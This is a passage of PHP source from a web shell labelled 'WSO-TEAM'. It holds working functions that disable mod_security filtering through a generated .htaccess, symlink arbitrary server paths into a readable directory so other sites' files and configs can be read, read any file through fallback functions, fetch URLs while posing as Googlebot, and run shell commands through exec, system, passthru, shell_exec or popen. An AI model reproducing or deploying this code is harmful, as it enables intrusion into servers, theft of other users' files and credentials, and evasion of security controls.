	if(GenerateFile('.htaccess', "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\nSecFilterCheckURLEncoding Off\nSecFilterCheckCookieFormat Off\nSecFilterCheckUnicodeEncoding Off\nSecFilterNormalizeCookies Off\n</IfModule>\n<Limit GET POST>\norder deny,allow\ndeny from all\nallow from all\n</Limit>\n<Limit PUT DELETE>\norder deny,allow\ndeny from all\n</Limit>\nSetEnv PHPRC ".getcwd()."/php.ini")){
		echo"<font size='2' face='Courier'>[+] .htaccess Has Been Generated Successfully</font><br /><br />";
	}else{
		echo"<font size='2' face='Courier'>Something Happened, Creat .htaccess Failed!</font><br /><br />";
	}
}

function readfils($file){
	$funs = array('require', 'include', 'file_get_contents', 'highlight_file', 'show_source', 'readfile');
	foreach($funs as $f){
		if(function_exists($f)){
			$r = $f($file);
			if($r){
				return print(htmlspecialchars($r));
				break;
			}
		}
	}
}

function Sym($path, $output){
	@mkdir('bps', 0755);
	$r = "Options all \nDirectoryIndex Sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
	GenerateFile('.htaccess', $r);

	$funs = array('symlink', 'copy');
	foreach($funs as $f){
		if(function_exists($f)){
			@$f($path, "bps/$output");
			break;
		}else{
			wsoEx("ln -s $path /bps/$output");
		}
	}
	if(file_exists("bps/$output")){
		echo"<font size='2' face='Courier'>Check File --> /bps/$output</font><br /><br />";
	}else{
		echo"<font size='2' face='Courier'>SYMLINK FAILED!</font><br /><br />";
	}
}

function get_configs_path(){
	$parse = pathinfo("http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]");
	$configs_path = $parse['dirname'].'/m4_configs/';
	return $configs_path;
}

function get_source($url){
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
	curl_setopt($ch,CURLOPT_TIMEOUT,30);
	$data=curl_exec($ch);
	curl_close($ch);
	
	return $data;
}
	
// BY WSO-TEAM
function wsoEx($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}

?>